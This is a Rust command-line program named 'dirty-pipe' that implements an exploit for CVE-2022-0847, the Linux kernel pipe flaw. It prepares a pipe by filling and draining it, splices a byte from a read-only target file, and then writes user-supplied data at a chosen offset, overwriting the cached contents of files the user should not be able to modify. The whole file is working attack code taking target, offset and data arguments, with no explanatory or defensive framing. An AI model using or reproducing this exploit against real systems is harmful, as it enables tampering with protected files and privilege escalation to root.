#![feature(maybe_uninit_uninit_array, layout_for_ptr)]

use clap::{arg, App};
use libc;
use std::alloc::Layout;
use std::ffi;
use std::os::raw::{c_char, c_void};
use std::process;
use std::slice;

const PAGE_SIZE: usize = 4096;

fn prepare_pipe(pipe: *mut i32) -> *mut i32 {
    println!("+ preparing pipe");

    let pipe_success = unsafe { libc::pipe(pipe) };
    println!("+ pipe errno: {}", pipe_success);

    let slice = unsafe { slice::from_raw_parts_mut(pipe, 2) };

    let pipe_capacity = unsafe { libc::fcntl(slice[0] as i32, libc::F_GETPIPE_SZ) };
    let pipe_wcapacity = unsafe { libc::fcntl(slice[1] as i32, libc::F_GETPIPE_SZ) };

    println!("+ tx_cap: {}; rx_cap: {}", pipe_wcapacity, pipe_capacity);

    let mut char_buffer: [char; PAGE_SIZE] = ['a'; PAGE_SIZE];

    /* In Linux versions before 2.6.11, the capacity of a pipe was the
       same as the system page size (e.g., 4096 bytes on i386).  Since
       Linux 2.6.11, the pipe capacity is 16 pages (i.e., 65,536 bytes
       in a system with a page size of 4096 bytes).  Since Linux 2.6.35,
       the default pipe capacity is 16 pages, but the capacity can be
       queried and set using the fcntl(2) F_GETPIPE_SZ and F_SETPIPE_SZ
       operations.
    */

    let mut w = pipe_wcapacity;
    while w > 0 {
        let n = if w > char_buffer.len() as i32 {
            char_buffer.len() as i32
        } else {
            w
        };
        println!("+++ writing {} bytes -- PipeBuffer Capacity: {}", n, w);

        unsafe {
            libc::write(
                slice[1] as i32,
                char_buffer.as_mut_ptr() as *const c_void,
                n as usize,
            )
        };
        w -= n
    }

    println!("+ pipe full!! pipe_size: {}", pipe_capacity);

    let mut r = pipe_capacity;
    while r > 0 {
        let n = if r > char_buffer.len() as i32 {
            char_buffer.len() as i32
        } else {
            r
        };
        println!("--- reading {} bytes -- PipeBuffer Size: {}", n, r);

        unsafe {
            libc::read(
                slice[0] as i32,
                char_buffer.as_mut_ptr() as *mut c_void,
                n as usize,
            )
        };

        r -= n
    }

    println!("+ pipe prepared!");
    pipe
}

fn main() {
    let matches = App::new("dirty-pipe")
        .about("CVE-2022-0847")
        .arg(
            arg!(
                -t --target <FILE> "TargetFile"
            )
            .required(true),
        )
        .arg(
            arg!(
                -o --offset <OFFSET> "Offset"
            )
            .required(true),
        )
        .arg(
            arg!(
                -d --data <DATA> "Data"
            )
            .required(true),
        )
        .get_matches();

    let target_file = matches.value_of("target").unwrap_or_else(|| {
        println!("could not parse target_file");
        process::exit(1)
    });

    let offset = matches
        .value_of("offset")
        .unwrap_or_else(|| {
            println!("could not parse offset");
            process::exit(1)
        })
        .parse::<libc::c_longlong>()
        .unwrap_or_else(|_| {
            println!("could not parse offset to c_longlong:i64");
            process::exit(1)
        });

    let data = matches.value_of("data").unwrap_or_else(|| {
        println!("could not parse data");
        process::exit(1)
    });

    let pipe_layout = Layout::new::<[i32; 2]>();
    let pipe = unsafe { std::alloc::alloc(pipe_layout) };

    let pipe = prepare_pipe(pipe as *mut i32);

    let mut offset = offset - 1;

    let file_to_open = ffi::CString::new(target_file).expect("c_char conversion failed");

    let fd = unsafe { libc::open(file_to_open.as_ptr() as *const c_char, libc::O_RDONLY) };

    let slice = unsafe { slice::from_raw_parts_mut(pipe, 2) };

    let nbytes =
        unsafe { libc::splice(fd, &mut offset, slice[1] as i32, std::ptr::null_mut(), 1, 0) };

    if nbytes < 0 {
        panic!("splice failed");
    } else if nbytes == 0 {
        panic!("short splice");
    }

    println!("+ spliced {} bytes from page into pipe", nbytes);

    let data_to_write = ffi::CString::new(data).expect("c_char conversion failed");

    println!(
        "+ trying to write {} bytes at offset {} to pipe",
        data_to_write.as_bytes().len(),
        offset
    );

    let nbytes = unsafe {
        libc::write(
            slice[1] as i32,
            data_to_write.as_ptr() as *const c_void,
            data_to_write.as_bytes().len(),
        )
    };

    if nbytes <= 0 {
        panic!("write failed");
    }

    println!("+ wrote {} bytes", nbytes);

    println!("++ success!!");

    unsafe {
        std::alloc::dealloc(pipe as *mut u8, pipe_layout);
    };
}
